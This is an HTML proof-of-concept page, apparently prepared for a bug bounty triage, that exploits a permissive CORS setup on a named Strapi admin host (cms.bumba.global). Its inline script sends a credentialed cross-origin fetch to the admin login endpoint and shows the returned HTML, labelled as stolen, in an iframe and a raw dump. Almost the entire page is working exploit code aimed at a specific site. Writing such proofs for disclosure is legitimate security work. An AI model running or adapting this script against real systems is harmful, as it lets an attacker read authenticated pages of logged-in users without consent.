<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>CORS PoC – cms.bumba.global</title>

  <!-- 1️⃣  Relax CSP on the GitHub‑Pages document so our inline script can run
       (GitHub‑Pages sends *no* CSP header today, but a meta tag is harmless
       and fixes the problem on platforms that inject a restrictive header). -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self' https://cms.bumba.global; connect-src https://cms.bumba.global; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src * data:;">

  <style>
    body { font-family: system-ui, sans-serif; margin: 0; padding: 1rem; }
    h2   { margin-top: 0; }
    iframe { width: 100%; height: 600px; border: 1px solid #aaa; }
    pre { background: #f6f8fa; padding: .75rem; overflow-x: auto; }
  </style>
</head>
<body>
  <h2>Arbitrary‑Origin <abbr title="Cross‑Origin Resource Sharing">CORS</abbr> PoC<br>
    <small>(Strapi Admin / Login rendered inside attacker origin)</small>
  </h2>

  <!-- Where we’ll inject the HTML we steal -->
  <iframe id="viewer" title="Stolen Admin HTML"></iframe>

  <!-- Raw fallback -->
  <h3>Raw response (for triagers who block iframes):</h3>
  <pre id="dump">loading…</pre>

  <script>
  (async () => {
    const viewer = document.getElementById('viewer');
    const dump   = document.getElementById('dump');

    console.log('[PoC] sending cross‑origin fetch…');

    try {
      const res  = await fetch('https://cms.bumba.global/admin/auth/login',
                               { credentials: 'include' });

      console.log('[PoC] fetch completed:', res.status, res.statusText);

      // If CORS *failed*, browser throws, so reaching here means ACAO + ACC passed.
      const html = await res.text();
      console.log('[PoC] received', html.length, 'bytes of HTML');

      /*  Inject <base> so relative assets load from the target host */
      const htmlWithBase = html.replace(
        /<head[^>]*>/i,
        '<head><base href="https://cms.bumba.global/">'
      );

      viewer.srcdoc      = htmlWithBase;
      dump.textContent   = html.slice(0, 8000) +
                           (html.length > 8000 ? '\n…(truncated)…' : '');

    } catch (err) {
      console.error('[PoC] fetch failed:', err);
      dump.textContent = 'Fetch failed: ' + err;
    }
  })();
  </script>
</body>
</html>
